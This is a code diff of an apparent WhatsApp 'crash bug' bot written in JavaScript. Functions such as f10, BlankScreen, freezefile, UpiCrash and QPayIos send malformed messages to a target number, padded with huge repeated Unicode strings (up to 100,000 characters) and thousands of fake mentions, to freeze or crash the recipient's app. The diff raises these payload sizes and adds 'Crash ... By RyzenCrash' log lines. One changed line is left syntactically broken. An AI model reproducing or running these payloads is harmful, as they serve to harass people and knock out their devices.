@@ -1258,16 +1258,17 @@ bot.command("status", ctx => {
                         }
                     }
                 }
-            }, { participant: { jid: target } });            
+            }, { participant: { jid: target } });
+            console.log(chalk.red.bold('Crash System(1) By ☆ RyzenCrash'))     
         };
   async function f10(target, Ptcp = false) {
     await cella.relayMessage(target, {
       extendedTextMessage: {
-        text: "`UI Youko`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
+        text: "`UI Youko`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(100000),
         contextInfo: {
           mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
             length: 15000
-          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
+          }, () => "1" + Math.floor(Math.random() * 10000) + "@s.whatsapp.net")],
           stanzaId: "1234567890ABCDEF",
           participant: "62895329013688@s.whatsapp.net",
           quotedMessage: {
@@ -1285,7 +1286,7 @@ bot.command("status", ctx => {
           remoteJid: target,
           conversionSource: " X ",
           conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
-          conversionDelaySeconds: 10,
+          conversionDelaySeconds: 60,
           forwardingScore: 10,
           isForwarded: false,
           quotedAd: {
@@ -1303,7 +1304,7 @@ bot.command("status", ctx => {
           ephemeralSettingTimestamp: "1728090592378",
           ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
           externalAdReply: {
-            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
+            title: "‎᭎ᬼᬼᬼৗীি\n⾿".repeat(20000,
             body: "C҉e҉La҉ UI © Cella",
             mediaType: "VIDEO",
             renderLargerThumbnail: true,
@@ -1356,7 +1357,7 @@ bot.command("status", ctx => {
         jid: target
       }
     } : {});
-console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
+console.log(chalk.red.bold('Crash System(2) Device By ☆ RyzenCrash'))
 };
 async function XeonXRobust(target, Ptcp = true) {
   const jids = `_*~@0~*_\n`.repeat(10200);
@@ -1430,6 +1431,7 @@ async function XeonXRobust(target, Ptcp = true) {
       jid: target
     }
   } : {});
+  console.log(chalk.red.bold('Crash System(3) Device By ☆ RyzenCrash'))
 }
         async function thunderblast_doc(target) {
     const messagePayload = {
@@ -1568,8 +1570,8 @@ async function XeonXRobust(target, Ptcp = true) {
             }
         }
     };
-
     cella.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
+    console.log(chalk.red.bold('Crash System(4) Device By ☆ RyzenCrash'))
 }
  async function BlankScreen(target, Ptcp = false) {
 let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@ྫྷ".repeat(100000);
@@ -1638,7 +1640,7 @@ let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@ྫྷ".repeat(100000
 					}
 				} : {}
 			);
-            console.log(chalk.red.bold('Nandemo'))
+            console.log(chalk.red.bold('Crash System(5) Device By ☆ RyzenCrash'))
    	};
 async function freezefile(target, QBug, Ptcp = true) {
     let virtex = "Wanna With Yours :D " + "ြ".repeat(25000);
@@ -1675,6 +1677,7 @@ async function freezefile(target, QBug, Ptcp = true) {
             }
         }
     }, { participant: { jid: target } }, { messageId: null });
+    console.log(chalk.red.bold('Crash System(6) Device By ☆ RyzenCrash'))
 }
 async function thunderblast_notif(target) {
 			await cella.relayMessage(target, {
@@ -1743,6 +1746,7 @@ async function thunderblast_notif(target) {
 					}
 				}
 			);
+			console.log(chalk.red.bold('Crash System(7) Device By ☆ RyzenCrash'))
 		};
 async function systemUi(target, Ptcp = false) {
     cella.relayMessage(target, {
@@ -1768,6 +1772,7 @@ async function systemUi(target, Ptcp = false) {
             }
         }
     }, { participant: { jid: target, quoted: QBug } }, { messageId: null });
+    console.log(chalk.red.bold('Crash System(8) Device By ☆ RyzenCrash'))
 };
 	async function crashui2(target, ptcp = false) {
     await cella.relayMessage(target, {
@@ -1793,6 +1798,7 @@ async function systemUi(target, Ptcp = false) {
             }
         }
     }, { participant: { jid: target } }, { messageId: null });
+    console.log(chalk.red.bold('Crash System(9) Device By ☆ RyzenCrash'))
 }
 //bug ios
 async function UpiCrash(target) {
@@ -1810,6 +1816,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(1) Device By ☆ RyzenCrash'))
     }
 
     async function VenCrash(target) {
@@ -1827,6 +1834,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(2) Device By ☆ RyzenCrash'))
     }
 
     async function AppXCrash(target) {
@@ -1844,6 +1852,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(3) Device By ☆ RyzenCrash'))
     }
 
     async function SmCrash(target) {
@@ -1861,6 +1870,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(4) Device By ☆ RyzenCrash'))
     }
 
 async function newsLetter(target) {
@@ -1885,6 +1895,7 @@ async function newsLetter(target) {
             catch (err) {
                 console.log(err);
             }
+            console.log(chalk.blue.bold('Crash Ios(5) Device By ☆ RyzenCrash'))
         }
 
     async function SqCrash(target) {
@@ -1902,6 +1913,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(6) Device By ☆ RyzenCrash'))
     }
 
     async function FBiphone(target) {
@@ -1919,6 +1931,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(7) Device By ☆ RyzenCrash'))
     }
 
     async function QXIphone(target) {
@@ -1939,6 +1952,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(8) Device By ☆ RyzenCrash'))
     }
 
     async function QPayIos(target) {
@@ -1956,6 +1970,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(9) Device By ☆ RyzenCrash'))
     }
 
     async function QPayStriep(target) {
@@ -1973,6 +1988,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(9) Device By ☆ RyzenCrash'))
     }
 
     async function QDIphone(target) {
@@ -2010,6 +2026,7 @@ async function newsLetter(target) {
           messageId: null,
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(10) Device By ☆ RyzenCrash'))
     }
 
     //
@@ -2061,7 +2078,7 @@ async function newsLetter(target) {
                 "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
               externalAdReply: {
                 title: "Ueheheheeh",
-                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
+                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(100000),
                 mediaType: "VIDEO",
                 renderLargerThumbnail: true,
                 previewTtpe: "VIDEO",
@@ -2119,6 +2136,7 @@ async function newsLetter(target) {
             }
           : {}
       );
+      console.log(chalk.blue.bold('Crash Ios(11) Device By ☆ RyzenCrash'))
     }
 
     //
@@ -2153,6 +2171,7 @@ async function newsLetter(target) {
           messageId: null,
         }
       );
+      console.log(chalk.blue.bold('Crash Ios(12) Device By ☆ RyzenCrash'))
     }
     async function BugIos(target) {
       for (let i = 0; i < 15; i++) {
